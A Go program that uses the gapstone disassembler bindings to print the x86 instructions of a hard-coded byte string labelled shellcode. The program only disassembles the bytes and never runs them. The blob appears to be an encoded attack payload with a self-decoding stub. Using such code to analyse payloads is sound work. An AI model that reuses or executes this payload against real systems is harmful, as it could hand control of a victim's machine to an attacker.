package main

import (
  "github.com/bnagy/gapstone"
  "log"
)

func main() {
  engine, err := gapstone.New(
    gapstone.CS_ARCH_X86,
    gapstone.CS_MODE_32,
  )

  if err != nil {
    log.Fatalf("Failed to initialize engine: %v", err)
  }

  shellcode := ""
  shellcode += "\xdb\xc5\xd9\x74\x24\xf4\xbe\xba\xbf\xbd\xf1\x58\x31\xc9\xb1"
  shellcode += "\x52\x31\x70\x17\x03\x70\x17\x83\x52\x43\x5f\x04\x5e\x54\x22"
  shellcode += "\xe7\x9e\xa5\x43\x61\x7b\x94\x43\x15\x08\x87\x73\x5d\x5c\x24"
  shellcode += "\xff\x33\x74\xbf\x8d\x9b\x7b\x08\x3b\xfa\xb2\x89\x10\x3e\xd5"
  shellcode += "\x09\x6b\x13\x35\x33\xa4\x66\x34\x74\xd9\x8b\x64\x2d\x95\x3e"
  shellcode += "\x98\x5a\xe3\x82\x13\x10\xe5\x82\xc0\xe1\x04\xa2\x57\x79\x5f"
  shellcode += "\x64\x56\xae\xeb\x2d\x40\xb3\xd6\xe4\xfb\x07\xac\xf6\x2d\x56"
  shellcode += "\x4d\x54\x10\x56\xbc\xa4\x55\x51\x5f\xd3\xaf\xa1\xe2\xe4\x74"
  shellcode += "\xdb\x38\x60\x6e\x7b\xca\xd2\x4a\x7d\x1f\x84\x19\x71\xd4\xc2"
  shellcode += "\x45\x96\xeb\x07\xfe\xa2\x60\xa6\xd0\x22\x32\x8d\xf4\x6f\xe0"
  shellcode += "\xac\xad\xd5\x47\xd0\xad\xb5\x38\x74\xa6\x58\x2c\x05\xe5\x34"
  shellcode += "\x81\x24\x15\xc5\x8d\x3f\x66\xf7\x12\x94\xe0\xbb\xdb\x32\xf7"
  shellcode += "\xbc\xf1\x83\x67\x43\xfa\xf3\xae\x80\xae\xa3\xd8\x21\xcf\x2f"
  shellcode += "\x18\xcd\x1a\xff\x48\x61\xf5\x40\x38\xc1\xa5\x28\x52\xce\x9a"
  shellcode += "\x49\x5d\x04\xb3\xe0\xa4\xcf\x7c\x5c\xa7\x3c\x15\x9f\xa7\x46"
  shellcode += "\x37\x16\x41\x2c\xa7\x7f\xda\xd9\x5e\xda\x90\x78\x9e\xf0\xdd"
  shellcode += "\xbb\x14\xf7\x22\x75\xdd\x72\x30\xe2\x2d\xc9\x6a\xa5\x32\xe7"
  shellcode += "\x02\x29\xa0\x6c\xd2\x24\xd9\x3a\x85\x61\x2f\x33\x43\x9c\x16"
  shellcode += "\xed\x71\x5d\xce\xd6\x31\xba\x33\xd8\xb8\x4f\x0f\xfe\xaa\x89"
  shellcode += "\x90\xba\x9e\x45\xc7\x14\x48\x20\xb1\xd6\x22\xfa\x6e\xb1\xa2"
  shellcode += "\x7b\x5d\x02\xb4\x83\x88\xf4\x58\x35\x65\x41\x67\xfa\xe1\x45"
  shellcode += "\x10\xe6\x91\xaa\xcb\xa2\xb2\x48\xd9\xde\x5a\xd5\x88\x62\x07"
  shellcode += "\xe6\x67\xa0\x3e\x65\x8d\x59\xc5\x75\xe4\x5c\x81\x31\x15\x2d"
  shellcode += "\x9a\xd7\x19\x82\x9b\xfd"

  insns, err := engine.Disasm(
    []byte(shellcode),
    0x10000,
    0,
  )

  if err == nil {
    log.Printf("Disasm:\n")
    for _, insn := range insns {
      log.Printf("0x%x:\t%s\t\t%s\n", insn.Address, insn.Mnemonic, insn.OpStr)
    }
  } else {
    log.Fatalf("Disassembly error: %v", err)
  }
}
